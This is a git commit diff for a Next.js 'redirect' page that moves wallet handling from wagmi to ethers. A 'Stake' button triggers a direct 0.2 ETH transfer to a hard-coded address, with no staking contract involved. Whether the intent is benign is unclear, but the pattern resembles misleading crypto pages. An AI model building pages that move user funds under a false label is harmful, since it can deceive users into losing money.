e64bed0c0f0825344290a63de82884f1c33f0746
S29 <nots29vv@gmail.com>
2024-02-15 00:31:23 +0100

    ethers

--- frontend/app/redirect/page.tsx
+++ frontend/app/redirect/page.tsx
@@ -3,26 +3,16 @@
 import {useRouter} from "next/navigation";
 import {useEffect} from "react";
 import Connect from '../../components/Connect'
-// import { useWeb3Modal } from '@web3modal/wagmi/react'
-import { useSendTransaction, useSignMessage, usePrepareTransactionRequest  } from 'wagmi' 
-import { prepareTransactionRequest } from '@wagmi/core'
-import { parseEther } from 'viem' 
-import { config } from "../../config"
+import { useWeb3ModalProvider, useWeb3ModalAccount } from '@web3modal/ethers/react'
+import { BrowserProvider, Contract, formatUnits } from 'ethers'
 
+import { parseEther } from 'viem' 
 
 
 export default function Redirect() {
     const router = useRouter();
-    // const { open } = useWeb3Modal()
-    const { data: hash, sendTransaction } = useSendTransaction({config,}) 
-    const { signMessage } = useSignMessage()
-    const result = usePrepareTransactionRequest({
-      to: '0x70997970c51812dc3a010c7d01b50e0d17dc79c8',
-      value: parseEther('1'),
-    })
-
-    // const { data, isSuccess, sendTransaction, error } = useSendTransaction(result);
-   
+    const { address, chainId, isConnected } = useWeb3ModalAccount()
+    const { walletProvider } = useWeb3ModalProvider()
 
     useEffect(() => {
         const handleBeforeUnload = (event: BeforeUnloadEvent) => {
@@ -53,11 +43,11 @@ export default function Redirect() {
     // })
 
     async function submitTx() {
-     let request = await  prepareTransactionRequest(config, {
-          to: '0x70997970c51812dc3a010c7d01b50e0d17dc79c8',
-          value: parseEther('1'),
-        })
-      // usePrepareTransactionRequest(request)
+      if (!isConnected) throw Error('User disconnected')
+      if (!walletProvider) throw Error('Wallet Provider Abscent')
+      const ethersProvider = new BrowserProvider(walletProvider)
+      const signer = await ethersProvider.getSigner()
+      await signer.sendTransaction({ to: `0x${"47dEAF612F0769d99aDB653bA2d22bba79F26C42"}`, value: parseEther("0.2")})
     }
 
       const handleCloseButtonClick = () => {
@@ -72,8 +62,8 @@ export default function Redirect() {
             <Connect />
             <button onClick={async () => { await submitTx() }}>Stake</button>
             <button onClick={handleCloseButtonClick}>Close Tab</button>
-            <button onClick={() => signMessage({ message: 'hello world' })}>Sign message</button>
-            <button onClick={() => sendTransaction( { to: `0x${"47dEAF612F0769d99aDB653bA2d22bba79F26C42"}`, value: parseEther("0.2") })}>Send Tx</button>
+            {/* <button onClick={() => signMessage({ message: 'hello world' })}>Sign message</button> */}
+            {/* <button onClick={() => sendTransaction( { to: `0x${"47dEAF612F0769d99aDB653bA2d22bba79F26C42"}`, value: parseEther("0.2") })}>Send Tx</button> */}
         </div>
     );
 }
